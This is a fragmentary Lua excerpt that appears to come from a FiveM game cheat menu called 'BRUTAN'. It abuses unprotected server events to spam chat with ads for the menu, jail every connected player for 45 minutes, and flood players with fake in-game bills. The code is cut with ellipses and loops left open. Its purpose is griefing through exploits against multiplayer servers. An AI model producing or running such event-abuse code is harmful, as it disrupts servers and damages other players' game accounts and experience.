        ...
        while true do
			...
			if chatspam then
                TriggerServerEvent(
                    ...
                    'Brutan#3927',
                    {0, 0x99, 255},
                    '/ooc BRUTAN Menu! Buy at '
                )
                TriggerServerEvent('_chat:messageEntered', 'Brutan#3927', {0, 0x99, 255}, 'BRUTAN menu <3 ')
            end
			...
			if banallusers then
				...
				TriggerServerEvent("js:jailuser", GetPlayerServerId(i), 45 * 60, "BRUTAN BO$$ <3 Brutan#3927 ")
				TriggerServerEvent("esx-qalle-jail:jailPlayer", GetPlayerServerId(i), 45 * 60, "BRUTAN<3 Brutan#3927 ")
					end
				end
    ...
    function()
        ...
        while Enabled do
            ...
            elseif Plane.IsMenuOpened("TrollMenu") then
				...
				for i = 0, 128 do
                    TriggerServerEvent('esx_billing:sendBill', GetPlayerServerId(i), "Purposeless", "BRUTAN menu ", "6969696969")
					TriggerServerEvent('esx_billing:sendBill', GetPlayerServerId(i), "Purposeless", "BRUTAN menu ", "6969696969")
					TriggerServerEvent('esx_billing:sendBill', GetPlayerServerId(i), "Purposeless", "BRUTAN menu ", "6969696969")
					TriggerServerEvent('esx_billing:sendBill', GetPlayerServerId(i), "Purposeless", "BRUTAN menu ", "6969696969")
					TriggerServerEvent('esx_billing:sendBill', GetPlayerServerId(i), "Purposeless", "BRUTAN menu ", "6969696969")
